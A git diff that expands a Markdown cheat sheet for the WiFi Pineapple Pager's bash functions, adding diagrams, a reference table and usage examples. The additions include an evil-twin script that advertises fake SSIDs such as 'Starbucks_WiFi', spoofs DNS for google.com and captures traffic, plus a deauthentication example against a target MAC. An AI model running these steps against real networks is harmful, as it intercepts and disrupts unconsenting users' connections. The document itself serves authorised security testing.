@@ -1,78 +1,151 @@
-# WiFi Pineapple Pager - Bash Functions Cheat Sheet
+# 🍍 WiFi Pineapple Pager - Bash Functions Cheat Sheet
 
 <div align="center">
 
-![WiFi Pineapple Pager](https://img.shields.io/badge/WiFi-Pineapple%20Pager-blue?style=for-the-badge)
-![Bash](https://img.shields.io/badge/Bash-Functions-green?style=for-the-badge)
+![WiFi Pineapple Pager](https://img.shields.io/badge/WiFi-Pineapple%20Pager-blue?style=for-the-badge&logo=wifi)
+![Bash](https://img.shields.io/badge/Bash-Functions-green?style=for-the-badge&logo=gnu-bash)
+![License](https://img.shields.io/badge/License-Educational-yellow?style=for-the-badge)
 
-**Complete reference guide for all bash functions available on the WiFi Pineapple Pager**
+**Complete interactive reference guide for all bash functions available on the WiFi Pineapple Pager**
 
-[Quick Start](#quick-start) • [Functions](#functions) • [Categories](#categories)
+[🚀 Quick Start](#-quick-start) • [📊 Diagrams](#-visual-diagrams) • [📚 Functions](#-function-reference) • [💡 Examples](#-common-workflows)
+
+[![GitHub stars](https://img.shields.io/github/stars/user/repo?style=social)](https://github.com)
+[![GitHub forks](https://img.shields.io/github/forks/user/repo?style=social)](https://github.com)
 
 </div>
 
 ---
 
-## 📋 Table of Contents
+## 📑 Table of Contents
 
-- [Overview](#overview)
-- [Architecture Diagram](#architecture-diagram)
-- [Quick Start](#quick-start)
-- [Function Categories](#function-categories)
-  - [User Interface & Interaction](#user-interface--interaction)
-  - [WiFi Operations](#wifi-operations)
-  - [PineAP Operations](#pineap-operations)
-  - [Network & VPN](#network--vpn)
-  - [GPS Operations](#gps-operations)
-  - [System Operations](#system-operations)
-  - [LED & Display](#led--display)
-  - [Logging & Data Collection](#logging--data-collection)
-  - [Payload Configuration](#payload-configuration)
-  - [USB Operations](#usb-operations)
+<details>
+<summary><b>Click to expand full table of contents</b></summary>
+
+- [🎯 Overview](#-overview)
+- [📊 Visual Diagrams](#-visual-diagrams)
+  - [System Architecture](#system-architecture)
+  - [WiFi Attack Workflow](#wifi-attack-workflow)
+  - [Network Setup Flow](#network-setup-flow)
+  - [Payload Execution Flow](#payload-execution-flow)
+- [🚀 Quick Start](#-quick-start)
+- [📋 Quick Reference Table](#-quick-reference-table)
+- [📚 Function Reference](#-function-reference)
+  - [🎨 User Interface & Interaction](#-user-interface--interaction)
+  - [📡 WiFi Operations](#-wifi-operations)
+  - [🍍 PineAP Operations](#-pineap-operations)
+  - [🌐 Network & VPN](#-network--vpn)
+  - [📍 GPS Operations](#-gps-operations)
+  - [⚙️ System Operations](#️-system-operations)
+  - [💡 LED & Display](#-led--display)
+  - [📝 Logging & Data Collection](#-logging--data-collection)
+  - [🎯 Payload Configuration](#-payload-configuration)
+  - [💾 USB Operations](#-usb-operations)
+- [💡 Common Workflows](#-common-workflows)
+- [🔧 Developer Functions](#-developer-functions)
+- [⚖️ Legal & Terms](#️-legal--terms)
+- [📚 Resources](#-resources)
+
+</details>
 
 ---
 
-## Overview
+## 🎯 Overview
 
-This cheat sheet contains all available bash functions for the **WiFi Pineapple Pager**, a powerful penetration testing and WiFi security research device. These functions allow you to programmatically control various aspects of the device including WiFi operations, network configuration, GPS tracking, and user interactions.
+<div align="center">
+
+**The WiFi Pineapple Pager** is a powerful penetration testing and WiFi security research device that enables authorized security professionals to test network security, perform reconnaissance, and conduct security assessments.
+
+</div>
+
+### ✨ Key Features
+
+<table>
+<tr>
+<td width="50%">
+
+**🔐 Security Testing**
+- WiFi client/AP operations
+- PineAP attack framework
+- MAC/SSID filtering
+- Deauthentication attacks
+
+</td>
+<td width="50%">
+
+**🌐 Network Services**
+- OpenVPN/WireGuard VPN
+- AutoSSH port forwarding
+- DNS spoofing
+- Network reconnaissance
+
+</td>
+</tr>
+<tr>
+<td width="50%">
+
+**📍 Location Tracking**
+- GPS integration
+- Wigle.net uploads
+- Location logging
+
+</td>
+<td width="50%">
+
+**🎨 User Interface**
+- Interactive dialogs
+- LED control
+- Vibration feedback
+- Progress indicators
+
+</td>
+</tr>
+</table>
 
 > **⚠️ Legal Notice**: Use of these functions in a setup script indicates your acceptance of the Hak5 Software License Agreement and Terms of Service. Always ensure you have proper authorization before using these tools.
 
 ---
 
-## Architecture Diagram
+## 📊 Visual Diagrams
+
+### System Architecture
 
 ```mermaid
 graph TB
-    A[WiFi Pineapple Pager] --> B[WiFi Operations]
-    A --> C[PineAP Engine]
-    A --> D[Network Services]
-    A --> E[GPS Module]
-    A --> F[User Interface]
+    subgraph "WiFi Pineapple Pager"
+        A[Core System] --> B[WiFi Stack]
+        A --> C[PineAP Engine]
+        A --> D[Network Layer]
+        A --> E[GPS Module]
+        A --> F[UI Layer]
+        
+        B --> B1[Client Mode<br/>wlan0cli]
+        B --> B2[Open AP<br/>wlan0open]
+        B --> B3[WPA AP<br/>wlan0wpa]
+        B --> B4[Management AP<br/>wlan0mgmt]
+        B --> B5[Monitor Mode<br/>wlan1mon]
+        
+        C --> C1[SSID Pool<br/>Management]
+        C --> C2[MAC Filtering<br/>Allow/Deny]
+        C --> C3[SSID Filtering<br/>Allow/Deny]
+        C --> C4[Deauth Engine]
+        C --> C5[Recon Sessions]
+        
+        D --> D1[OpenVPN Client]
+        D --> D2[WireGuard Client]
+        D --> D3[AutoSSH Tunnels]
+        D --> D4[DNS Spoofing]
+        
+        E --> E1[GPS Tracking]
+        E --> E2[Wigle Integration]
+        
+        F --> F1[Alerts & Dialogs]
+        F --> F2[Input Pickers]
+        F --> F3[LED Control]
+        F --> F4[Vibration]
+    end
     
-    B --> B1[Client Mode]
-    B --> B2[AP Mode]
-    B --> B3[Management AP]
-    
-    C --> C1[SSID Pool]
-    C --> C2[MAC Filtering]
-    C --> C3[Deauth Attacks]
-    C --> C4[Recon Sessions]
-    
-    D --> D1[OpenVPN]
-    D --> D2[WireGuard]
-    D --> D3[AutoSSH]
-    D --> D4[DNS Spoofing]
-    
-    E --> E1[Location Tracking]
-    E --> E2[Wigle Integration]
-    
-    F --> F1[Alerts & Dialogs]
-    F --> F2[Input Pickers]
-    F --> F3[LED Control]
-    F --> F4[Vibration]
-    
-    style A fill:#4a90e2,stroke:#333,stroke-width:3px,color:#fff
+    style A fill:#4a90e2,stroke:#333,stroke-width:4px,color:#fff
     style B fill:#50c878,stroke:#333,stroke-width:2px
     style C fill:#ff6b6b,stroke:#333,stroke-width:2px
     style D fill:#ffa500,stroke:#333,stroke-width:2px
@@ -80,53 +153,331 @@ graph TB
     style F fill:#3498db,stroke:#333,stroke-width:2px
 ```
 
+### WiFi Attack Workflow
+
+```mermaid
+sequenceDiagram
+    participant User
+    participant Pager
+    participant Target
+    participant Client
+    
+    User->>Pager: Start Recon Session
+    Pager->>Target: Monitor WiFi Traffic
+    Pager->>User: Collect SSIDs & MACs
+    
+    User->>Pager: Add SSIDs to Pool
+    Pager->>Pager: PINEAPPLE_SSID_POOL_ADD
+    
+    User->>Pager: Start SSID Pool
+    Pager->>Pager: PINEAPPLE_SSID_POOL_START
+    Pager->>Client: Advertise Fake SSIDs
+    
+    Client->>Pager: Connect to Fake AP
+    Pager->>User: ALERT "Client Connected"
+    
+    User->>Pager: Enable DNS Spoofing
+    Pager->>Pager: DNSSPOOF_ADD_HOST
+    Pager->>Client: Redirect DNS Queries
+    
+    User->>Pager: Start Packet Capture
+    Pager->>Pager: WIFI_PCAP_START
+    Pager->>User: Log Captured Data
+```
+
+### Network Setup Flow
+
+```mermaid
+flowchart TD
+    Start([Device Boot]) --> Accept{Accept<br/>Terms?}
+    Accept -->|No| End1([Cannot Proceed])
+    Accept -->|Yes| SLA[SLA_ACCEPT]
+    SLA --> TOS[TOS_ACCEPT]
+    
+    TOS --> Config{Configure<br/>Network?}
+    
+    Config -->|WiFi Client| WiFi[WIFI_CONNECT]
+    Config -->|VPN| VPN{Which VPN?}
+    Config -->|SSH Tunnel| SSH[AUTOSSH_CONFIGURE]
+    
+    VPN -->|OpenVPN| OVPN[OPENVPN_CONFIGURE]
+    VPN -->|WireGuard| WG[WIREGUARD_CONFIGURE]
+    
+    WiFi --> Wait[WIFI_WAIT]
+    OVPN --> OVPN_EN[OPENVPN_ENABLE]
+    WG --> WG_EN[WIREGUARD_ENABLE]
+    SSH --> SSH_EN[AUTOSSH_ENABLE]
+    
+    Wait --> Success([Connected])
+    OVPN_EN --> Success
+    WG_EN --> Success
+    SSH_EN --> Success
+    
+    style Start fill:#90EE90
+    style Success fill:#87CEEB
+    style End1 fill:#FFB6C1
+```
+
+### Payload Execution Flow
+
+```mermaid
+stateDiagram-v2
+    [*] --> Initialized: Device Ready
+    Initialized --> TermsAccepted: SLA_ACCEPT<br/>TOS_ACCEPT
+    TermsAccepted --> Configuring: PAYLOAD_SET_CONFIG
+    Configuring --> WiFiSetup: WIFI_CONNECT
+    WiFiSetup --> Connected: WIFI_WAIT
+    Connected --> PineAP: PINEAPPLE_SSID_POOL_START
+    PineAP --> Monitoring: PINEAPPLE_RECON_NEW
+    Monitoring --> ClientDetected: Client Connects
+    ClientDetected --> DataCollection: WIFI_PCAP_START
+    DataCollection --> Logging: LOG Data
+    Logging --> Upload: WIGLE_UPLOAD
+    Upload --> [*]: Complete
+```
+
 ---
 
-## Quick Start
+## 🚀 Quick Start
 
-### Accepting Terms of Service
+### 🎯 5-Minute Setup
 
-Before using the device, you must accept the terms:
+<details>
+<summary><b>📝 Step-by-Step Initial Setup</b></summary>
+
+#### Step 1: Accept Legal Terms
 
 ```bash
 # Accept Software License Agreement
 SLA_ACCEPT --i-accept
 
-# Accept Terms of Service
+# Accept Terms of Service  
 TOS_ACCEPT --i-accept
 ```
 
-### Basic WiFi Connection
+#### Step 2: Connect to WiFi (Optional)
 
 ```bash
 # Connect to a WiFi network
 WIFI_CONNECT wlan0cli "MyNetwork" psk2 "password123"
 
-# Wait for connection
+# Wait for connection (30 seconds timeout)
 WIFI_WAIT wlan0cli 30
 ```
 
-### Create an Open Access Point
+#### Step 3: Set Admin Password
 
 ```bash
-# Configure an open AP
-WIFI_OPEN_AP wlan0open "FreeWiFi"
-
-# Start advertising SSIDs
-PINEAPPLE_SSID_POOL_START
+# Set device password
+PASSWORD "YourSecurePassword123"
 ```
+
+#### Step 4: Test LED
+
+```bash
+# Test LED functionality
+LED blue solid
+DPADLED green
+```
+
+</details>
+
+### 🎨 Interactive Examples
+
+<details>
+<summary><b>🔐 Create Evil Twin AP</b></summary>
+
+```bash
+#!/bin/bash
+
+# Accept terms
+SLA_ACCEPT --i-accept
+TOS_ACCEPT --i-accept
+
+# Show alert
+ALERT "Starting Evil Twin Attack"
+
+# Add target SSID to pool
+PINEAPPLE_SSID_POOL_ADD "FreeWiFi"
+PINEAPPLE_SSID_POOL_ADD "Starbucks_WiFi"
+
+# Start advertising
+PINEAPPLE_SSID_POOL_START
+
+# Wait for client
+ALERT "Waiting for client connection..."
+
+# When client connects, enable DNS spoofing
+DNSSPOOF_ADD_HOST A "google.com" "192.168.1.100"
+DNSSPOOF_ENABLE
+
+# Start packet capture
+WIFI_PCAP_START
+
+ALERT_RINGTONE true "Client connected!"
+```
+
+</details>
+
+<details>
+<summary><b>🌐 Setup VPN Connection</b></summary>
+
+```bash
+#!/bin/bash
+
+# Configure OpenVPN
+OPENVPN_CONFIGURE enable /root/config.ovpn
+OPENVPN_ENABLE
+
+# Or configure WireGuard
+WIREGUARD_CONFIGURE enable /root/wg.conf
+WIREGUARD_ENABLE
+
+# Test connection
+ALERT "VPN Connection Established"
+```
+
+</details>
+
+<details>
+<summary><b>📍 GPS Tracking with Wigle</b></summary>
+
+```bash
+#!/bin/bash
+
+# Configure GPS
+GPS_CONFIGURE /dev/ttyUSB0 9600
+
+# Login to Wigle
+WIGLE_LOGIN "username" "password"
+
+# Start GPS tracking
+GPS_GET
+WIGLE_START
+
+# Log location
+LOG "GPS Tracking Started"
+
+# Later: Upload data
+WIGLE_UPLOAD --archive
+```
+
+</details>
 
 ---
 
-## Function Categories
+## 📋 Quick Reference Table
 
-## User Interface & Interaction
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Function</th>
+<th>Purpose</th>
+<th>Common Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td rowspan="3">🎨 UI</td>
+<td><code>ALERT</code></td>
+<td>Show alert</td>
+<td>Notifications</td>
+</tr>
+<tr>
+<td><code>PROMPT</code></td>
+<td>Wait for user</td>
+<td>User interaction</td>
+</tr>
+<tr>
+<td><code>IP_PICKER</code></td>
+<td>Get IP input</td>
+<td>User input</td>
+</tr>
+<tr>
+<td rowspan="4">📡 WiFi</td>
+<td><code>WIFI_CONNECT</code></td>
+<td>Connect to AP</td>
+<td>Network access</td>
+</tr>
+<tr>
+<td><code>WIFI_OPEN_AP</code></td>
+<td>Create open AP</td>
+<td>Evil twin</td>
+</tr>
+<tr>
+<td><code>WIFI_WPA_AP</code></td>
+<td>Create WPA AP</td>
+<td>Secure AP</td>
+</tr>
+<tr>
+<td><code>WIFI_PCAP_START</code></td>
+<td>Start capture</td>
+<td>Traffic analysis</td>
+</tr>
+<tr>
+<td rowspan="4">🍍 PineAP</td>
+<td><code>PINEAPPLE_SSID_POOL_ADD</code></td>
+<td>Add SSID</td>
+<td>SSID pool</td>
+</tr>
+<tr>
+<td><code>PINEAPPLE_SSID_POOL_START</code></td>
+<td>Start advertising</td>
+<td>Attack start</td>
+</tr>
+<tr>
+<td><code>PINEAPPLE_DEAUTH_CLIENT</code></td>
+<td>Deauth client</td>
+<td>Force disconnect</td>
+</tr>
+<tr>
+<td><code>PINEAPPLE_RECON_NEW</code></td>
+<td>Start recon</td>
+<td>Reconnaissance</td>
+</tr>
+<tr>
+<td rowspan="3">🌐 Network</td>
+<td><code>OPENVPN_ENABLE</code></td>
+<td>Enable OpenVPN</td>
+<td>VPN access</td>
+</tr>
+<tr>
+<td><code>DNSSPOOF_ADD_HOST</code></td>
+<td>DNS redirect</td>
+<td>Traffic redirect</td>
+</tr>
+<tr>
+<td><code>AUTOSSH_ENABLE</code></td>
+<td>SSH tunnel</td>
+<td>Remote access</td>
+</tr>
+<tr>
+<td rowspan="2">📍 GPS</td>
+<td><code>GPS_CONFIGURE</code></td>
+<td>Setup GPS</td>
+<td>Location tracking</td>
+</tr>
+<tr>
+<td><code>WIGLE_START</code></td>
+<td>Start Wigle</td>
+<td>Location logging</td>
+</tr>
+</tbody>
+</table>
+
+---
+
+## 📚 Function Reference
+
+## 🎨 User Interface & Interaction
 
 ### Alerts and Dialogs
 
-#### `ALERT`
-Raise a modal alert.
+<details>
+<summary><b>🔔 ALERT - Raise a modal alert</b></summary>
 
+**Syntax:**
 ```bash
 ALERT [MESSAGE]
 ```
@@ -134,13 +485,20 @@ ALERT [MESSAGE]
 **Example:**
 ```bash
 ALERT "Connection established!"
+ALERT "Attack started successfully"
 ```
 
----
+**Use Cases:**
+- Notify user of status changes
+- Display important information
+- Confirm actions
 
-#### `ALERT_RINGTONE`
-Raise a modal alert with ringtone.
+</details>
 
+<details>
+<summary><b>🔊 ALERT_RINGTONE - Alert with sound</b></summary>
+
+**Syntax:**
 ```bash
 ALERT_RINGTONE [ring] [MESSAGE]
 ```
@@ -151,388 +509,413 @@ ALERT_RINGTONE [ring] [MESSAGE]
 **Example:**
 ```bash
 ALERT_RINGTONE true "Incoming connection!"
+ALERT_RINGTONE false "Silent notification"
 ```
 
----
+</details>
 
-#### `PROMPT`
-Raise a modal alert and wait for user to dismiss before continuing.
+<details>
+<summary><b>⏸️ PROMPT - Wait for user dismissal</b></summary>
 
+**Syntax:**
 ```bash
 PROMPT [MESSAGE]
 ```
 
----
+**Example:**
+```bash
+PROMPT "Press OK to continue"
+```
 
-#### `ERROR_DIALOG`
-Show the user an error dialog.
+**Difference from ALERT:**
+- `ALERT` - Non-blocking
+- `PROMPT` - Blocks execution until dismissed
 
+</details>
+
+<details>
+<summary><b>❌ ERROR_DIALOG - Show error</b></summary>
+
+**Syntax:**
 ```bash
 ERROR_DIALOG [text]
 ```
 
----
+**Example:**
+```bash
+ERROR_DIALOG "Connection failed!"
+```
 
-#### `CONFIRMATION_DIALOG`
-Ask the user to confirm an action.
+</details>
 
+<details>
+<summary><b>✅ CONFIRMATION_DIALOG - Get user confirmation</b></summary>
+
+**Syntax:**
 ```bash
 CONFIRMATION_DIALOG [text]
 ```
 
----
+**Example:**
+```bash
+if CONFIRMATION_DIALOG "Start attack?"; then
+    PINEAPPLE_SSID_POOL_START
+fi
+```
+
+</details>
 
 ### Input Pickers
 
-#### `IP_PICKER`
-Ask the user to interactively enter an IP address.
+<details>
+<summary><b>🌐 IP_PICKER - Get IP address input</b></summary>
 
+**Syntax:**
 ```bash
 IP_PICKER [title] [default IP]
 ```
 
 **Example:**
 ```bash
-IP_PICKER "Enter Target IP" "192.168.1.1"
+TARGET_IP=$(IP_PICKER "Enter Target IP" "192.168.1.1")
+echo "Target: $TARGET_IP"
 ```
 
----
+</details>
 
-#### `MAC_PICKER`
-Ask the user to interactively enter a MAC address.
+<details>
+<summary><b>📱 MAC_PICKER - Get MAC address input</b></summary>
 
+**Syntax:**
 ```bash
 MAC_PICKER [title] [default mac]
 ```
 
----
+**Example:**
+```bash
+TARGET_MAC=$(MAC_PICKER "Enter Target MAC" "aa:bb:cc:dd:ee:ff")
+PINEAPPLE_DEAUTH_CLIENT "00:11:22:33:44:55" "$TARGET_MAC" 6
+```
 
-#### `NUMBER_PICKER`
-Ask the user to interactively enter a number.
+</details>
 
+<details>
+<summary><b>🔢 NUMBER_PICKER - Get number input</b></summary>
+
+**Syntax:**
 ```bash
 NUMBER_PICKER [title] [default number]
 ```
 
----
+**Example:**
+```bash
+TIMEOUT=$(NUMBER_PICKER "Timeout (seconds)" "30")
+WIFI_WAIT wlan0cli $TIMEOUT
+```
 
-#### `TEXT_PICKER`
-Ask the user to interactively enter text.
+</details>
 
+<details>
+<summary><b>📝 TEXT_PICKER - Get text input</b></summary>
+
+**Syntax:**
 ```bash
 TEXT_PICKER [title] [default text]
 ```
 
----
+**Example:**
+```bash
+SSID=$(TEXT_PICKER "Enter SSID" "FreeWiFi")
+PINEAPPLE_SSID_POOL_ADD "$SSID"
+```
+
+</details>
 
 ### Button Input
 
-#### `WAIT_FOR_BUTTON_PRESS`
-Wait for button input from a user.
+<details>
+<summary><b>🔘 WAIT_FOR_BUTTON_PRESS - Wait for button</b></summary>
 
+**Syntax:**
 ```bash
 WAIT_FOR_BUTTON_PRESS {button}
 ```
 
-Returns the name of the button pressed by the user.
+**Returns:** Name of button pressed
 
----
+**Example:**
+```bash
+BUTTON=$(WAIT_FOR_BUTTON_PRESS)
+if [ "$BUTTON" = "UP" ]; then
+    ALERT "Up button pressed"
+fi
+```
 
-#### `WAIT_FOR_INPUT`
-Wait for button input from a user, returns button pressed.
+</details>
 
+<details>
+<summary><b>⌨️ WAIT_FOR_INPUT - Wait for any input</b></summary>
+
+**Syntax:**
 ```bash
 WAIT_FOR_INPUT
 ```
 
----
+**Example:**
+```bash
+ALERT "Press any button to continue"
+WAIT_FOR_INPUT
+```
+
+</details>
 
 ### Progress Indicators
 
-#### `START_SPINNER`
-Start a spinner (indeterminate progress indicator).
+<details>
+<summary><b>⏳ START_SPINNER - Show progress</b></summary>
 
+**Syntax:**
 ```bash
 START_SPINNER [text]
 ```
 
-Returns a spinner ID which is used with `STOP_SPINNER` to finish the interaction.
+**Returns:** Spinner ID
 
 **Example:**
 ```bash
-SPINNER_ID=$(START_SPINNER "Connecting...")
-# ... do work ...
-STOP_SPINNER $SPINNER_ID
+SPINNER=$(START_SPINNER "Connecting to WiFi...")
+WIFI_CONNECT wlan0cli "Network" psk2 "pass"
+WIFI_WAIT wlan0cli 30
+STOP_SPINNER $SPINNER
+ALERT "Connected!"
 ```
 
----
+</details>
 
-#### `STOP_SPINNER`
-Stop a spinner (indeterminate progress indicator).
+<details>
+<summary><b>⏹️ STOP_SPINNER - Hide progress</b></summary>
 
+**Syntax:**
 ```bash
 STOP_SPINNER [id]
 ```
 
-**Parameters:**
-- `id` - Spinner ID to stop (from `START_SPINNER`)
-
----
+</details>
 
 ### Audio & Vibration
 
-#### `RINGTONE`
-Play a ringtone.
+<details>
+<summary><b>🔔 RINGTONE - Play ringtone</b></summary>
 
+**Syntax:**
 ```bash
 RINGTONE {--vibrate} [rtttl | name]
 ```
 
-**Parameters:**
-- `--vibrate` - Vibrate in sync with the supplied ringtone
-- `rtttl` - Ringtone encoded in RTTTL format
-- `name` - Name of a saved ringtone
+**Example:**
+```bash
+RINGTONE --vibrate "alert"
+RINGTONE "d:d=4,o=5,b=200:c,c,c"
+```
 
----
+</details>
 
-#### `VIBRATE`
-Activate the vibration motor.
+<details>
+<summary><b>📳 VIBRATE - Activate vibration</b></summary>
 
+**Syntax:**
 ```bash
 VIBRATE [rtttl | name]
 ```
 
-**Parameters:**
-- `rtttl` - Ringtone/vibration pattern encoded in RTTTL format
-- `name` - Name of a saved ringtone
+**Example:**
+```bash
+VIBRATE "pattern1"
+```
+
+</details>
 
 ---
 
-## WiFi Operations
+## 📡 WiFi Operations
 
 ### Client Mode
 
-#### `WIFI_CONNECT`
-Configure WiFi client behavior and connect to an AP.
+<details>
+<summary><b>🔌 WIFI_CONNECT - Connect to WiFi network</b></summary>
 
+**Syntax:**
 ```bash
 WIFI_CONNECT [interface] [ssid] [encryption] {key} {bssid}
 ```
 
 **Parameters:**
-- `interface` - Interface to configure (typically `wlan0cli`)
-- `ssid` - SSID to connect to
-- `encryption` - Encryption configuration:
-  - `open` - No encryption
-  - `psk` - WPA PSK
-  - `psk2` - WPA2 PSK
-  - `sae` - WPA3 SAE (personal)
-- `key` - Encryption key (or `NONE`)
-- `bssid` - Specific BSSID (or `ANY`)
+- `interface` - Typically `wlan0cli`
+- `ssid` - Network name
+- `encryption` - `open`, `psk`, `psk2`, `sae`
+- `key` - Password or `NONE`
+- `bssid` - Specific BSSID or `ANY`
 
-**Example:**
+**Examples:**
 ```bash
-WIFI_CONNECT wlan0cli "MyNetwork" psk2 "mypassword" ANY
+# Open network
+WIFI_CONNECT wlan0cli "FreeWiFi" open NONE ANY
+
+# WPA2 network
+WIFI_CONNECT wlan0cli "MyNetwork" psk2 "password123" ANY
+
+# WPA3 network
+WIFI_CONNECT wlan0cli "SecureNet" sae "securepass" ANY
 ```
 
----
+</details>
 
-#### `WIFI_DISCONNECT`
-Disconnect from a WiFi network.
+<details>
+<summary><b>🔌 WIFI_DISCONNECT - Disconnect from network</b></summary>
 
+**Syntax:**
 ```bash
 WIFI_DISCONNECT [interface]
 ```
 
----
+</details>
 
-#### `WIFI_CLEAR`
-Disconnect and clear a WiFi client configuration.
+<details>
+<summary><b>🧹 WIFI_CLEAR - Clear WiFi config</b></summary>
 
+**Syntax:**
 ```bash
 WIFI_CLEAR [interface]
 ```
 
----
+</details>
 
-#### `WIFI_WAIT`
-Wait for WiFi client to establish a connection.
+<details>
+<summary><b>⏱️ WIFI_WAIT - Wait for connection</b></summary>
 
+**Syntax:**
 ```bash
 WIFI_WAIT [interface] [count]
 ```
 
-**Parameters:**
-- `interface` - WiFi client interface (typically `wlan0cli`)
-- `count` - Optional number of seconds to wait
+**Example:**
+```bash
+WIFI_CONNECT wlan0cli "Network" psk2 "pass"
+WIFI_WAIT wlan0cli 30  # Wait up to 30 seconds
+```
 
----
+</details>
 
 ### Access Point Configuration
 
-#### `WIFI_OPEN_AP`
-Configure an open AP.
+<details>
+<summary><b>📡 WIFI_OPEN_AP - Create open access point</b></summary>
 
+**Syntax:**
 ```bash
 WIFI_OPEN_AP [interface] [ssid] {bssid}
 ```
 
-**Parameters:**
-- `interface` - WiFi interface (typically `wlan0open`)
-- `ssid` - Open SSID
-- `bssid` - Specific BSSID (or blank for default)
-
----
-
-#### `WIFI_OPEN_AP_CLEAR`
-Clear an open AP configuration.
-
+**Example:**
 ```bash
-WIFI_OPEN_AP_CLEAR [interface]
+WIFI_OPEN_AP wlan0open "FreeWiFi"
+WIFI_OPEN_AP wlan0open "PublicWiFi" "00:11:22:33:44:55"
 ```
 
----
+**Common Use:** Evil twin attacks, captive portals
 
-#### `WIFI_OPEN_AP_DISABLE`
-Disable an open AP.
+</details>
 
-```bash
-WIFI_OPEN_AP_DISABLE [interface]
-```
+<details>
+<summary><b>🔒 WIFI_WPA_AP - Create WPA protected AP</b></summary>
 
----
-
-#### `WIFI_OPEN_AP_HIDE`
-Disable the open AP SSID.
-
-> **Note:** A hidden SSID can still be discovered by common WiFi tools. Clients which have already observed the SSID will continue to show it after hiding.
-
-```bash
-WIFI_OPEN_AP_HIDE [interface]
-```
-
----
-
-#### `WIFI_WPA_AP`
-Configure a WPA AP.
-
+**Syntax:**
 ```bash
 WIFI_WPA_AP [interface] [ssid] [encryption] [key] {bssid}
 ```
 
-**Parameters:**
-- `interface` - WiFi interface (typically `wlan0wpa`)
-- `ssid` - Management SSID
-- `encryption` - Encryption configuration:
-  - `psk` - WPA PSK
-  - `psk2` - WPA2 PSK
-  - `sae-mixed` - WPA2 PSK/WPA3 SAE
-  - `sae` - WPA3 SAE (personal)
-- `key` - Encryption key
-- `bssid` - Specific BSSID (or blank for default)
+**Encryption Options:**
+- `psk` - WPA PSK
+- `psk2` - WPA2 PSK
+- `sae-mixed` - WPA2/WPA3 mixed
+- `sae` - WPA3 SAE
 
----
-
-#### `WIFI_WPA_AP_CLEAR`
-Clear a WPA AP configuration.
-
+**Example:**
 ```bash
-WIFI_WPA_AP_CLEAR [interface]
+WIFI_WPA_AP wlan0wpa "SecureAP" psk2 "SecurePassword123"
 ```
 
----
+</details>
 
-#### `WIFI_WPA_AP_DISABLE`
-Disable a WPA AP.
+<details>
+<summary><b>🛡️ WIFI_MGMT_AP - Create management AP</b></summary>
 
-```bash
-WIFI_WPA_AP_DISABLE [interface]
-```
-
----
-
-#### `WIFI_WPA_AP_HIDE`
-Disable the WPA AP SSID.
-
-```bash
-WIFI_WPA_AP_HIDE [interface]
-```
-
----
-
-#### `WIFI_MGMT_AP`
-Configure a management AP.
-
+**Syntax:**
 ```bash
 WIFI_MGMT_AP [interface] [ssid] [encryption] [key] {bssid}
 ```
 
-**Parameters:**
-- `interface` - WiFi interface (typically `wlan0mgmt`)
-- `ssid` - Management SSID
-- `encryption` - Encryption configuration:
-  - `psk2` - WPA2 PSK
-  - `sae-mixed` - WPA2 PSK/WPA3 SAE
-  - `sae` - WPA3 SAE (personal)
-- `key` - Encryption key
-- `bssid` - Specific BSSID (or blank for default)
-
----
-
-#### `WIFI_MGMT_AP_CLEAR`
-Clear a management AP configuration.
-
+**Example:**
 ```bash
-WIFI_MGMT_AP_CLEAR [interface]
+WIFI_MGMT_AP wlan0mgmt "Management" sae "AdminPass123"
 ```
 
----
+</details>
 
-#### `WIFI_MGMT_AP_DISABLE`
-Disable a management AP.
+<details>
+<summary><b>👁️ WIFI_*_AP_HIDE - Hide SSID</b></summary>
 
+**Syntax:**
 ```bash
-WIFI_MGMT_AP_DISABLE [interface]
-```
-
----
-
-#### `WIFI_MGMT_AP_HIDE`
-Disable the management AP SSID.
-
-```bash
+WIFI_OPEN_AP_HIDE [interface]
+WIFI_WPA_AP_HIDE [interface]
 WIFI_MGMT_AP_HIDE [interface]
 ```
 
----
+> **Note:** Hidden SSIDs can still be discovered. This is not a security feature.
+
+</details>
 
 ### Packet Capture
 
-#### `WIFI_PCAP_START`
-Start a pcap log via pineapd.
+<details>
+<summary><b>📦 WIFI_PCAP_START - Start packet capture</b></summary>
 
+**Syntax:**
 ```bash
 WIFI_PCAP_START
 ```
 
----
+**Example:**
+```bash
+WIFI_PCAP_START
+LOG "Packet capture started"
+# ... do work ...
+WIFI_PCAP_STOP
+```
 
-#### `WIFI_PCAP_STOP`
-Stop a pcap log.
+</details>
 
+<details>
+<summary><b>⏹️ WIFI_PCAP_STOP - Stop packet capture</b></summary>
+
+**Syntax:**
 ```bash
 WIFI_PCAP_STOP
 ```
 
+</details>
+
 ---
 
-## PineAP Operations
+## 🍍 PineAP Operations
 
 ### SSID Pool Management
 
-#### `PINEAPPLE_SSID_POOL_ADD`
-Add to the SSID advertising pool.
+<details>
+<summary><b>➕ PINEAPPLE_SSID_POOL_ADD - Add SSID to pool</b></summary>
 
+**Syntax:**
 ```bash
 PINEAPPLE_SSID_POOL_ADD [ssid]
 ```
@@ -541,402 +924,327 @@ PINEAPPLE_SSID_POOL_ADD [ssid]
 ```bash
 PINEAPPLE_SSID_POOL_ADD "FreeWiFi"
 PINEAPPLE_SSID_POOL_ADD "Starbucks_WiFi"
+PINEAPPLE_SSID_POOL_ADD "attwifi"
 ```
 
----
+</details>
 
-#### `PINEAPPLE_SSID_POOL_DELETE`
-Remove a SSID from the advertising pool.
+<details>
+<summary><b>▶️ PINEAPPLE_SSID_POOL_START - Start advertising</b></summary>
 
-```bash
-PINEAPPLE_SSID_POOL_DELETE [ssid]
-```
-
----
-
-#### `PINEAPPLE_SSID_POOL_LIST`
-List SSID advertising pool.
-
-```bash
-PINEAPPLE_SSID_POOL_LIST
-```
-
----
-
-#### `PINEAPPLE_SSID_POOL_CLEAR`
-Clear the SSID advertisement pool.
-
-```bash
-PINEAPPLE_SSID_POOL_CLEAR
-```
-
----
-
-#### `PINEAPPLE_SSID_POOL_START`
-Start advertising SSIDs from the SSID pool.
-
+**Syntax:**
 ```bash
 PINEAPPLE_SSID_POOL_START {random}
 ```
 
 **Parameters:**
-- `random` - Use pseudo-random BSSIDs on advertised SSIDs
+- `random` - Use random BSSIDs (may cause issues)
 
-> **Warning:** Randomizing the BSSID may cause issues with modern WiFi clients. Check the documentation for more information.
+**Example:**
+```bash
+PINEAPPLE_SSID_POOL_START
+# Or with random BSSIDs
+PINEAPPLE_SSID_POOL_START random
+```
 
----
+</details>
 
